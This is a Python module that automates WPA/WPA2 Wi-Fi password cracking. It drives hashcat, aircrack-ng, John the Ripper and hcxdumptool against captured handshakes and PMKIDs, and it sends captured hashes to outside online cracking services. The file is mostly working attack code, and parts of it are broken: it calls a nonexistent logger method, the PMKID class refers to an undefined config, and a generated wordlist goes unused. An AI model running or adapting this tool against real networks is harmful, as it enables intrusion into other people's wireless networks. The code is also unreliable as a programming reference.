import logging
import subprocess
import threading
import queue
import time
from typing import Optional, List, Tuple
from dataclasses import dataclass
import hashlib
import os

logger = logging.getLogger(__name__)


@dataclass
class CrackConfig:
    handshake_file: str
    wordlist: str
    bssid: str
    ssid: str
    timeout: int = 600
    use_gpu: bool = True
    use_rule_engine: bool = True
    batch_size: int = 1000


class AdvancedPasswordCrack:
    """Advanced WPA/WPA2 password cracking"""
    
    def __init__(self, config: CrackConfig):
        self.config = config
        self.found_password = None
        self.crack_thread = None
        self.stop_event = threading.Event()
        self.gpu_available = self._check_gpu()
        
    def _check_gpu(self) -> bool:
        """Check if GPU acceleration is available"""
        try:
            result = subprocess.run(
                ['hashcat', '--version'],
                timeout=5,
                capture_output=True
            )
            return result.returncode == 0
        except:
            return False
    
    def _generate_wordlist_combinations(self, base_wordlist: str) -> str:
        """Generate wordlist combinations with rules"""
        if not self.config.use_rule_engine:
            return base_wordlist
        
        output_file = f"{base_wordlist}_combined.txt"
        
        try:
            # Apply John the Ripper rules
            cmd = [
                'john',
                '--wordlist=' + base_wordlist,
                '--rules=Single',
                '--stdout',
                base_wordlist
            ]
            
            with open(output_file, 'w') as out:
                subprocess.run(
                    cmd,
                    stdout=out,
                    timeout=60,
                    capture_output=False
                )
            
            logger.info(f"[+] Generated combined wordlist: {output_file}")
            return output_file
            
        except Exception as e:
            logger.warning(f"Failed to generate combinations: {e}")
            return base_wordlist
    
    def crack_with_hashcat(self) -> Optional[str]:
        """Crack using hashcat (GPU accelerated)"""
        if not self.gpu_available:
            return None
        
        logger.info("[*] Attempting GPU-accelerated crack with hashcat...")
        
        try:
            # Convert cap to hccapx
            convert_cmd = [
                'cap2hccapx',
                self.config.handshake_file,
                f"{self.config.handshake_file}.hccapx"
            ]
            
            subprocess.run(convert_cmd, timeout=30, capture_output=True)
            
            # Hashcat WPA2 mode: 2500
            cmd = [
                'hashcat',
                '-m', '2500',  # WPA/WPA2
                '-a', '0',     # Dictionary attack
                '-w', '4',     # Workload: Nightmare
                '--gpu-temp-retain=75',
                '--potfile-path=/tmp/wifite_hashcat.pot',
                f"{self.config.handshake_file}.hccapx",
                self.config.wordlist,
                '-O'  # Optimized kernels
            ]
            
            result = subprocess.run(
                cmd,
                timeout=self.config.timeout,
                capture_output=True,
                text=True
            )
            
            # Extract password
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if ':' in line and self.config.bssid.lower() in line.lower():
                        password = line.split(':')[-1].strip()
                        logger.success(f"[+] Password found: {password}")
                        return password
            
        except Exception as e:
            logger.debug(f"Hashcat crack failed: {e}")
        
        return None
    
    def crack_with_aircrack(self) -> Optional[str]:
        """Crack using aircrack-ng"""
        logger.info("[*] Attempting crack with aircrack-ng...")
        
        try:
            cmd = [
                'aircrack-ng',
                '-a', '2',  # WPA algorithm
                '-b', self.config.bssid,
                '-w', self.config.wordlist,
                self.config.handshake_file,
                '-q'  # Quiet mode
            ]
            
            result = subprocess.run(
                cmd,
                timeout=self.config.timeout,
                capture_output=True,
                text=True
            )
            
            for line in result.stdout.split('\n') + result.stderr.split('\n'):
                if 'KEY FOUND' in line or 'Passphrase:' in line:
                    password = line.split(':')[-1].strip()
                    if password and password != 'KEY FOUND':
                        logger.success(f"[+] Password found: {password}")
                        return password
            
        except subprocess.TimeoutExpired:
            logger.warning("[-] Aircrack timeout")
        except Exception as e:
            logger.error(f"Aircrack crack failed: {e}")
        
        return None
    
    def optimize_wordlist(self) -> str:
        """Optimize wordlist by prioritizing likely passwords"""
        output_file = f"{self.config.wordlist}_optimized.txt"
        
        try:
            # SSID variations
            ssid_variations = [
                self.config.ssid,
                self.config.ssid.upper(),
                self.config.ssid.capitalize(),
                self.config.ssid[::-1],
            ]
            
            with open(output_file, 'w') as out:
                # Write SSID variations first
                for var in ssid_variations:
                    out.write(var + '\n')
                
                # Then read original wordlist
                with open(self.config.wordlist, 'r') as original:
                    for line in original:
                        out.write(line)
            
            logger.info("[+] Wordlist optimized")
            return output_file
            
        except Exception as e:
            logger.warning(f"Wordlist optimization failed: {e}")
            return self.config.wordlist
    
    def crack(self) -> Optional[str]:
        """Execute password crack"""
        logger.info(f"[*] Starting password crack for {self.config.ssid}")
        logger.info(f"[*] Handshake: {self.config.handshake_file}")
        logger.info(f"[*] Wordlist: {self.config.wordlist}")
        
        start_time = time.time()
        
        # Optimize wordlist
        wordlist = self.optimize_wordlist()
        
        # Try GPU first
        if self.gpu_available:
            password = self.crack_with_hashcat()
            if password:
                elapsed = time.time() - start_time
                logger.success(f"[+] Crack completed in {elapsed:.1f} seconds")
                return password
        
        # Fall back to aircrack
        password = self.crack_with_aircrack()
        if password:
            elapsed = time.time() - start_time
            logger.success(f"[+] Crack completed in {elapsed:.1f} seconds")
            return password
        
        logger.error("[-] Password crack failed")
        return None
    
    def online_crack(self, password_hash: str) -> Optional[str]:
        """Attempt online password cracking"""
        logger.info("[*] Attempting online password crack...")
        
        try:
            import requests
            
            # Try online services (use responsibly)
            services = [
                f"https://hashkiller.co.uk/api/crackHash.php?hash={password_hash}&type=14900",
                f"https://www.onlinehashcrack.com/api/hash/crack?hash={password_hash}&type=pmkid",
            ]
            
            for service_url in services:
                try:
                    response = requests.get(service_url, timeout=10)
                    if response.status_code == 200:
                        data = response.json()
                        if 'result' in data and data['result']:
                            return data['result']
                except:
                    pass
            
        except ImportError:
            logger.warning("Requests library not available for online crack")
        
        return None


class PMKIDAttack:
    """PMKID-based WPA2 attack (faster than handshake)"""
    
    def __init__(self, interface: str, bssid: str, channel: int):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.pmkid = None
    
    def capture_pmkid(self, timeout: int = 60) -> Optional[str]:
        """Capture PMKID"""
        logger.info("[*] Attempting PMKID capture...")
        
        try:
            cmd = [
                'hcxdumptool',
                '-i', self.interface,
                '-o', '/tmp/pmkid.pcapng',
                '-b', self.config.bssid,
                '-c', str(self.channel),
                '--enable-status',
                f'--time={timeout}'
            ]
            
            result = subprocess.run(
                cmd,
                timeout=timeout + 10,
                capture_output=True,
                text=True
            )
            
            if 'PMKID' in result.stdout:
                logger.success("[+] PMKID captured")
                return '/tmp/pmkid.pcapng'
            
        except Exception as e:
            logger.debug(f"PMKID capture failed: {e}")
        
        return None
